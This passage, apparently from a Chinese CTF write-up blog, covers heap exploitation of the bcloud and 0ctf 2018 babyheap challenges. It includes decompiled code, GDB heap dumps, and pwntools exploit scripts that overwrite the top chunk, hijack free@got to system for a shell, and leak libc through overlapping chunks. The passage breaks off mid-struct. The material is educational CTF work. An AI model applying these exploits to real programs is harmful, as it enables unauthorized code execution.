read_str(&amp;v3, <span class=\"number\">64</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\">  v4 = (<span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x40</span>u); <span class=\"comment\">// chunkptr1</span></span><br><span class=\"line\">  v2 = (<span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x40</span>u); <span class=\"comment\">// chunkptr2</span></span><br><span class=\"line\">  org = v2;</span><br><span class=\"line\">  host = v4;</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(v4, &amp;v3);<span class=\"comment\">// 从v3地址起复制</span></span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(v2, &amp;s); <span class=\"comment\">// 从s地址起复制到v2，越界。</span></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"OKay! Enjoy:)\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v5;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>首先向栈中s处开始写0x40，然后向v3处写0x40，如果都写满0x40个字节，在malloc v4和v2的时候，会把那一个\\x00覆盖掉，导致从栈中s处copy栈上数据一直到v3的填充结束。这里是典型的由于strcpy函数的不安全性导致的错误。</p>\n<h4 id=\"read-str\"><a href=\"#read-str\" class=\"headerlink\" title=\"read_str\"></a>read_str</h4><p>这里read_str函数中存在漏洞</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">read_str</span><span class=\"params\">(<span class=\"keyword\">char</span> *s, <span class=\"keyword\">int</span> len, <span class=\"keyword\">char</span> stop)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [esp+1Bh] [ebp-Dh]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> i; <span class=\"comment\">// [esp+1Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; len; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">1u</span>) &lt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">      <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( buf == stop )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    s[i] = buf;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  s[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当碰到\\n时会停止循环，如果读入完整长度，最后会多覆盖一个\\x00。</p>\n<h4 id=\"new-note\"><a href=\"#new-note\" class=\"headerlink\" title=\"new_note\"></a>new_note</h4><p>通过bss段上的notelist全局数组管理堆块，每次malloc输入的size+4，size存在notesize上，然后读入内容，最后把相应的issync数组项置为0。</p>\n<h4 id=\"show-note\"><a href=\"#show-note\" class=\"headerlink\" title=\"show_note\"></a>show_note</h4><p>假的，无法使用。</p>\n<h4 id=\"edit-note\"><a href=\"#edit-note\" class=\"headerlink\" title=\"edit_note\"></a>edit_note</h4><p>输入id，从notelist上取出相应chunk的指针，然后将对应id的issync置为0，最后根据存储的size进行edit</p>\n<h4 id=\"delete-note\"><a href=\"#delete-note\" class=\"headerlink\" title=\"delete_note\"></a>delete_note</h4><p>输入id，将notelist和notesize全部置为0，再free。</p>\n<h4 id=\"syn\"><a href=\"#syn\" class=\"headerlink\" title=\"syn\"></a>syn</h4><p>将issync前十位都置为1。</p>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><h4 id=\"leak-heap\"><a href=\"#leak-heap\" class=\"headerlink\" title=\"leak heap\"></a>leak heap</h4><p>只要在输入name时输入0x40的数据即可泄漏出heap地址，因为堆块内存和堆块地址在栈上相邻。</p>\n<h4 id=\"修改top-chunk的size\"><a href=\"#修改top-chunk的size\" class=\"headerlink\" title=\"修改top chunk的size\"></a>修改top chunk的size</h4><p>调试得到top chunk的size会被org的前4个byte覆盖。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  heap chunks</span><br><span class=\"line\">Chunk(addr=0x8178008, size=0x48, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x08178008     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa]</span><br><span class=\"line\">Chunk(addr=0x8178050, size=0x48, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x08178050     63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63    cccccccccccccccc]</span><br><span class=\"line\">Chunk(addr=0x8178098, size=0x48, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x08178098     62 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62    bbbbbbbbbbbbbbbb]</span><br><span class=\"line\">Chunk(addr=0x81780e0, size=0x63636360, flags=PREV_INUSE|IS_MMAPPED)  ←  top chunk</span><br><span class=\"line\"></span><br><span class=\"line\">gef➤  x/64x 0x08178050</span><br><span class=\"line\">0x8178050:\t0x63636363\t0x63636363\t0x63636363\t0x63636363</span><br><span class=\"line\">0x8178060:\t0x63636363\t0x63636363\t0x63636363\t0x63636363</span><br><span class=\"line\">0x8178070:\t0x63636363\t0x63636363\t0x63636363\t0x63636363</span><br><span class=\"line\">0x8178080:\t0x63636363\t0x63636363\t0x63636363\t0x63636363</span><br><span class=\"line\">0x8178090:\t0x00000000\t0x00000049\t0x62626262\t0x62626262</span><br><span class=\"line\">0x81780a0:\t0x62626262\t0x62626262\t0x62626262\t0x62626262</span><br><span class=\"line\">0x81780b0:\t0x62626262\t0x62626262\t0x62626262\t0x62626262</span><br><span class=\"line\">0x81780c0:\t0x62626262\t0x62626262\t0x62626262\t0x62626262</span><br><span class=\"line\">0x81780d0:\t0x62626262\t0x62626262\t0x08178098\t0x63636363</span><br><span class=\"line\">0x81780e0:\t0x63636363\t0x63636363\t0x63636363\t0x63636363</span><br><span class=\"line\">0x81780f0:\t0x63636363\t0x63636363\t0x63636363\t0x63636363</span><br><span class=\"line\">0x8178100:\t0x63636363\t0x63636363\t0x63636363\t0x63636363</span><br><span class=\"line\">0x8178110:\t0x63636363\t0x63636363\t0x63636363\t0x00000000</span><br><span class=\"line\">0x8178120:\t0x00000000\t0x00000000\t0x00000000\t0x00000000</span><br><span class=\"line\">0x8178130:\t0x00000000\t0x00000000\t0x00000000\t0x00000000</span><br><span class=\"line\">0x8178140:\t0x00000000\t0x00000000\t0x00000000\t0x00000000</span><br></pre></td></tr></table></figure>\n<p>exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p.recvuntil(<span class=\"string\">\"Org:\\n\"</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">\"b\"</span> * <span class=\"number\">0x40</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Host:\\n\"</span>)</span><br><span class=\"line\">p.sendline(p32(<span class=\"number\">0xffffffff</span>) + <span class=\"string\">\"c\"</span> * <span class=\"number\">0x3c</span>)</span><br></pre></td></tr></table></figure>\n<p>结果如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  heap chunks</span><br><span class=\"line\">Chunk(addr=0x877b008, size=0x48, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x0877b008     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa]</span><br><span class=\"line\">Chunk(addr=0x877b050, size=0x48, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x0877b050     ff ff ff ff 63 63 63 63 63 63 63 63 63 63 63 63    ....cccccccccccc]</span><br><span class=\"line\">Chunk(addr=0x877b098, size=0x48, flags=PREV_INUSE)</span><br><span class=\"line\">    [0x0877b098     62 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62    bbbbbbbbbbbbbbbb]</span><br><span class=\"line\">Chunk(addr=0x877b0e0, size=0xfffffff8, flags=PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)  ←  top chunk</span><br></pre></td></tr></table></figure>\n<p>所以就可以实现任意写了</p>\n<h4 id=\"leak-libc\"><a href=\"#leak-libc\" class=\"headerlink\" title=\"leak libc\"></a>leak libc</h4><p>由于程序中没有leak的功能，我们要实现leak libc，需要劫持某个got表为最一开始打印用户名的函数，而且这个libc函数的参数还需要我们能控制，所以我们只能选择free函数。</p>\n<p>因为程序是通过notelist管理chunk，所以只要我们劫持了notelist，也就可以实现任意地址读写。</p>\n<p>所以我们将chunk分配到notelist之前，然后依次修改notelist上前几项为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">puts@got # 0</span><br><span class=\"line\">free@got # 1</span><br><span class=\"line\">&amp;notelist[3] # 2</span><br><span class=\"line\">/bin # 3</span><br><span class=\"line\">/sh\\x00 4</span><br></pre></td></tr></table></figure>\n<p>首先edit(1)，劫持free@got为info函数，然后delete(0)，即可leak出libc。</p>\n<h4 id=\"RCE\"><a href=\"#RCE\" class=\"headerlink\" title=\"RCE\"></a>RCE</h4><p>然后edit(1)，劫持free@got为system，最后delte(2)即可getshell。</p>\n<h3 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./bcloud\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./bcloud\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">allocate</span><span class=\"params\">(size, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"&gt;&gt;\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"note content:\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"the content:\\n\"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">allocate__</span><span class=\"params\">(size)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"&gt;&gt;\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"note content:\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">update</span><span class=\"params\">(index, content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"&gt;&gt;\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"id:\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"content:\\n\"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"&gt;&gt;\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"id:\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\">info = <span class=\"number\">0x8048779</span></span><br><span class=\"line\">notelist = <span class=\"number\">0x804b120</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak heap</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"name:\\n\"</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">\"a\"</span> * <span class=\"number\">0x40</span>)</span><br><span class=\"line\">heap_addr = u32(p.recvuntil(<span class=\"string\">\"!\"</span>)[<span class=\"number\">-5</span>:<span class=\"number\">-1</span>]) - <span class=\"number\">8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># change top chunk</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Org:\\n\"</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">\"b\"</span> * <span class=\"number\">0x40</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Host:\\n\"</span>)</span><br><span class=\"line\">p.send(p32(<span class=\"number\">0xffffffff</span>) + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># malloc to notelist</span></span><br><span class=\"line\">offset = (notelist - <span class=\"number\">0x8</span>) - (heap_addr + <span class=\"number\">0xd8</span>) - <span class=\"number\">0x8</span></span><br><span class=\"line\">allocate__(offset) <span class=\"comment\"># 0</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(elf.got[<span class=\"string\">'puts'</span>]) <span class=\"comment\">#0</span></span><br><span class=\"line\">payload += p32(elf.got[<span class=\"string\">'free'</span>]) <span class=\"comment\"># 1</span></span><br><span class=\"line\">payload += p32(notelist + <span class=\"number\">0x4</span> * <span class=\"number\">3</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">payload += <span class=\"string\">\"/bin/sh\\x00\"</span> <span class=\"comment\"># 3 4</span></span><br><span class=\"line\">allocate(len(payload), payload) <span class=\"comment\"># 1</span></span><br><span class=\"line\"></span><br><span class=\"line\">update(<span class=\"number\">1</span>, p32(info) + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">puts_got = u32(p.recvuntil(<span class=\"string\">\"\\xf7\"</span>)[<span class=\"number\">-4</span>:])</span><br><span class=\"line\">libc.address = puts_got - libc.symbols[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">update(<span class=\"number\">1</span>, p32(system) + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"0ctf-2018-babyheap\"><a href=\"#0ctf-2018-babyheap\" class=\"headerlink\" title=\"0ctf 2018 babyheap\"></a>0ctf 2018 babyheap</h2><h3 id=\"防护-1\"><a href=\"#防护-1\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/pwn/baby-heap-2018$ checksec babyheap</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/pwn/baby-heap-2018/babyheap&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n<p>全防护</p>\n<h3 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析\"></a>分析</h3><h4 id=\"allocate\"><a href=\"#allocate\" class=\"headerlink\" title=\"allocate\"></a>allocate</h4><p>​    最多16个chunk，size不大于0x58，每次calloc之后将list数组上对应位置的inuse置1，并存储size和chunkptr，但是并没有写入chunk的内容。</p>\n<h4 id=\"update\"><a href=\"#update\" class=\"headerlink\" title=\"update\"></a>update</h4><p>​    输入Index和一个size，然后如果输入的size小于等于原来的size+1，就可以以输入的size向堆上写，也就是这里存在off by one漏洞。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">fastcall <span class=\"title\">update</span><span class=\"params\">(element *<span class=\"built_in\">list</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 oldSizePlus1; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> i; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> newsize; <span class=\"comment\">// [rsp+1Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Index: \"</span>);</span><br><span class=\"line\">  i = getlong();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( i &gt;= <span class=\"number\">0</span> &amp;&amp; i &lt;= <span class=\"number\">15</span> &amp;&amp; <span class=\"built_in\">list</span>[i].inuse == <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Size: \"</span>);</span><br><span class=\"line\">    LODWORD(oldSizePlus1) = getlong();</span><br><span class=\"line\">    newsize = oldSizePlus1;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)oldSizePlus1 &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      oldSizePlus1 = <span class=\"built_in\">list</span>[i].size + <span class=\"number\">1</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( newsize &lt;= oldSizePlus1 )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"Content: \"</span>);</span><br><span class=\"line\">        readN((<span class=\"keyword\">char</span> *)<span class=\"built_in\">list</span>[i].chunkptr, newsize);<span class=\"comment\">// off by one</span></span><br><span class=\"line\">        LODWORD(oldSizePlus1) = <span class=\"built_in\">printf</span>(<span class=\"string\">\"Chunk %d Updated\\n\"</span>, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)i);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    LODWORD(oldSizePlus1) = <span class=\"built_in\">puts</span>(<span class=\"string\">\"Invalid Index\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> oldSizePlus1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"delete\"><a href=\"#delete\" class=\"headerlink\" title=\"delete\"></a>delete</h4><p>free掉对应chunk，并将数组上相应位置设置为NULL，不存在UAF。</p>\n<h4 id=\"view\"><a href=\"#view\" class=\"headerlink\" title=\"view\"></a>view</h4><p>根据inuse，show出chunk的内容。</p>\n<h3 id=\"利用-1\"><a href=\"#利用-1\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>本题应该是构造overlapping，以实现信息泄漏和fastbin attack。</p>\n<h4 id=\"leak-libc-1\"><a href=\"#leak-libc-1\" class=\"headerlink\" title=\"leak libc\"></a>leak libc</h4><p>溢出一个小chunk，改大下一个chunk的size位，然后free掉被修改的chunk，这时chunk将会被放到unsorted bin中，之后再malloc较小的size，即可从被分离后的last remainder处leak处main_arena地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># leak libc</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x18</span>)</span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">allocate(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">payload = <span class=\"number\">0x18</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\xa1\"</span></span><br><span class=\"line\">update(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">allocate(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">view(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">libc.address = addr - <span class=\"number\">0x3c4b78</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"劫持控制流\"><a href=\"#劫持控制流\" class=\"headerlink\" title=\"劫持控制流\"></a>劫持控制流</h4><p>按常规思路，我们只要能将chunk申请到malloc_hook之前的那个位置（即保证size为0x7f），然后修改malloc_hook为one_gadget即可，但是本题对申请的chunk的size进行限制，最大只能为0x60，所以不可能通过直接的fastbin attack修改fd从而申请到那个位置。这里，我们采用改main_arena中的top指针的方法，令下次分配从top指针指向的地址开始。</p>\n<p>main_arena的结构如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span> &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">/* Serialize access.  */</span></span><br><span class=\"line\">    __libc_lock_define(, mutex);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Flags (formerly in max_fast).  */</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> flags;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Fastbins */</span></span><br><span class=\"line\">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class=\"line\">    mchunkptr top; <span class=\"comment\">// top chunk的地址</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* The remainder from the most recent split of a small request */</span></span><br><span class=\"line\">    mchunkptr last_remainder;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Normal bins packed as described above */</span></span><br><span class=\"line\">    mchunkptr bins[ NBINS * <span class=\"number\">2</span> - <span class=\"number\">2</span> ];</span><br><span 